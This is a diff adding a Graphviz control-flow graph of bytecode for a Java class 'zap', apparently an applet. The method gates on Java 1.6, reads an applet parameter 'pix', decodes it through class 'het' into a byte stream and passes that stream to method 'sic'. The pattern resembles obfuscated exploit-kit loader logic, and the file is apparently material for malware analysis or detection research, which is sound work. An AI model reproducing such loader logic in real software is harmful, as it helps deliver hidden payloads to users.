@@ -1,0 +1,55 @@
+digraph "" {
+    "r0 := @this: zap"
+    "push \"java.version\""
+    "r0 := @this: zap"->"push \"java.version\"";
+    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"
+    "push \"java.version\""->"staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>";
+    "push \"1.6.\""
+    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"->"push \"1.6.\"";
+    "virtualinvoke <java.lang.String: int indexOf(java.lang.String)>"
+    "push \"1.6.\""->"virtualinvoke <java.lang.String: int indexOf(java.lang.String)>";
+    "push -1"
+    "virtualinvoke <java.lang.String: int indexOf(java.lang.String)>"->"push -1";
+    "ifcmpeq.i goto return"
+    "push -1"->"ifcmpeq.i goto return";
+    "load.r r0"
+    "ifcmpeq.i goto return"->"load.r r0";
+    "push \"pix\""
+    "load.r r0"->"push \"pix\"";
+    "virtualinvoke <zap: java.lang.String getParameter(java.lang.String)>"
+    "push \"pix\""->"virtualinvoke <zap: java.lang.String getParameter(java.lang.String)>";
+    "staticput <zap: java.lang.String haj>"
+    "virtualinvoke <zap: java.lang.String getParameter(java.lang.String)>"->"staticput <zap: java.lang.String haj>";
+    "staticget <zap: java.lang.String haj>"
+    "staticput <zap: java.lang.String haj>"->"staticget <zap: java.lang.String haj>";
+    "virtualinvoke <java.lang.String: int length()>"
+    "staticget <zap: java.lang.String haj>"->"virtualinvoke <java.lang.String: int length()>";
+    "ifle goto return"
+    "virtualinvoke <java.lang.String: int length()>"->"ifle goto return";
+    "new het"
+    "ifle goto return"->"new het";
+    "dup1.r"
+    "new het"->"dup1.r";
+    "specialinvoke <het: void <init>()>"
+    "dup1.r"->"specialinvoke <het: void <init>()>";
+    "staticput <zap: het leg>"
+    "specialinvoke <het: void <init>()>"->"staticput <zap: het leg>";
+    "staticget <zap: het leg>"
+    "staticput <zap: het leg>"->"staticget <zap: het leg>";
+    "staticget <zap: het leg>"->"staticget <zap: java.lang.String haj>";
+    "virtualinvoke <het: java.io.ByteArrayInputStream main(java.lang.String)>"
+    "staticget <zap: java.lang.String haj>"->"virtualinvoke <het: java.io.ByteArrayInputStream main(java.lang.String)>";
+    "staticput <zap: java.io.ByteArrayInputStream pah>"
+    "virtualinvoke <het: java.io.ByteArrayInputStream main(java.lang.String)>"->"staticput <zap: java.io.ByteArrayInputStream pah>";
+    "staticput <zap: java.io.ByteArrayInputStream pah>"->"load.r r0";
+    "staticget <zap: java.io.ByteArrayInputStream pah>"
+    "load.r r0"->"staticget <zap: java.io.ByteArrayInputStream pah>";
+    "virtualinvoke <zap: void sic(java.io.ByteArrayInputStream)>"
+    "staticget <zap: java.io.ByteArrayInputStream pah>"->"virtualinvoke <zap: void sic(java.io.ByteArrayInputStream)>";
+    "goto return"
+    "virtualinvoke <zap: void sic(java.io.ByteArrayInputStream)>"->"goto return";
+    "return"
+    "goto return"->"return";
+    "store.r r0"
+    "virtualinvoke <zap: void sic(java.io.ByteArrayInputStream)>"->"store.r r0";
+}
